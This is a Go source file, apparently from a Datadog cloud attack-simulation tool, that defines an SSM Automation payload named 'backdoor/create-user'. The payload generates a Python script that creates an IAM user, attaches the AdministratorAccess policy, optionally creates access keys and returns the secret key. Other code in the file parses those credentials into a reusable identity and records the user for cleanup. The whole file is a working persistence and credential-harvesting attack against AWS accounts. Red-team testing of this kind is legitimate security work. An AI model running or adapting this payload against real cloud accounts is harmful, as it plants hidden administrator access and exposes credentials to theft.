// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

import (
	"fmt"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// AutomationBackdoorCreateUserPayload creates an IAM user with administrator privileges
// via an SSM Automation aws:executeScript Python step.
type AutomationBackdoorCreateUserPayload struct{}

func init() {
	_ = payloads.Register(&AutomationBackdoorCreateUserPayload{})
}

func (p *AutomationBackdoorCreateUserPayload) GetName() string {
	return "backdoor/create-user"
}

func (p *AutomationBackdoorCreateUserPayload) GetDescription() string {
	return "Create an IAM user with administrator privileges via SSM Automation Python step"
}

func (p *AutomationBackdoorCreateUserPayload) GetTags() []string {
	return []string{
		payloads.TagServiceSSMAutomation,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *AutomationBackdoorCreateUserPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "USER_NAME",
			Description: "Name for the backdoor user (auto-generated if empty)",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "ACCESS_KEY",
			Description: "Create programmatic access keys and return credentials",
			Required:    false,
			Default:     "true",
		},
	}
}

func (p *AutomationBackdoorCreateUserPayload) Validate(options map[string]string) error {
	return nil
}

func (p *AutomationBackdoorCreateUserPayload) GenerateCode(options map[string]string) (string, error) {
	userName := options["USER_NAME"]
	createAccessKey := options["ACCESS_KEY"] != "false"

	userNamePython := `"pathrunner-admin-" + str(int(__import__('time').time()))`
	if userName != "" {
		userNamePython = fmt.Sprintf(`"%s"`, userName)
	}

	accessKeyBlock := `
        result['AccessKey'] = False`
	if createAccessKey {
		accessKeyBlock = `
        key_resp = iam.create_access_key(UserName=user_name)
        result['AccessKeyId'] = key_resp['AccessKey']['AccessKeyId']
        result['SecretAccessKey'] = key_resp['AccessKey']['SecretAccessKey']`
	}

	code := fmt.Sprintf(`import boto3

def script_handler(events, context):
    iam = boto3.client('iam')
    user_name = %s

    try:
        create_resp = iam.create_user(UserName=user_name)
        user_arn = create_resp['User']['Arn']

        iam.attach_user_policy(
            UserName=user_name,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',
        )

        result = {
            'Status': 'Success',
            'UserName': user_name,
            'UserArn': user_arn,
        }
        %s
        return result
    except Exception as e:
        return {'Status': 'Error', 'message': str(e)}
`, userNamePython, accessKeyBlock)

	return code, nil
}

func (p *AutomationBackdoorCreateUserPayload) ProcessResult(result string) (string, error) {
	if result == "" {
		return "", nil
	}

	accessKeyID := extractJSONField(result, "AccessKeyId")
	secretAccessKey := extractJSONField(result, "SecretAccessKey")
	userName := extractJSONField(result, "UserName")

	if accessKeyID == "" || secretAccessKey == "" {
		return result, nil
	}

	identityName := "backdoor/" + userName
	if userName == "" {
		identityName = "backdoor/ssm-automation-user"
	}

	return fmt.Sprintf("%s\n--- PATHFINDER_IDENTITY_DATA ---\nNAME=%s\nTYPE=keys\nACCESS_KEY_ID=%s\nSECRET_ACCESS_KEY=%s\nAUTO_SWITCH=false\n--- END_PATHFINDER_IDENTITY_DATA ---\n",
		result, identityName, accessKeyID, secretAccessKey), nil
}

// ReportSideEffects returns the created user as a tracked resource.
func (p *AutomationBackdoorCreateUserPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	userName := options["USER_NAME"]
	if userName == "" {
		userName = "pathrunner-admin-<timestamp>"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:user",
			Name:          userName,
			CleanupMethod: "iam:DeleteUser",
			Metadata: map[string]string{
				"access_key": options["ACCESS_KEY"],
			},
		},
	}
}
